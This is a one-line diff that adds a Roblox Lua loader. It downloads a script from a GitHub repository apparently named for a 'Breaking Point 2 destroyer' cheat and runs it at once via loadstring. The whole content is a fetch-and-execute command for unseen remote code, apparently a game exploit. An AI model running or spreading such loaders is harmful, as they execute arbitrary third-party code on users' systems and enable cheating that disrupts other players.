@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TakeModzz/Breaking-Point-2-destroyer-/main/Script"))()
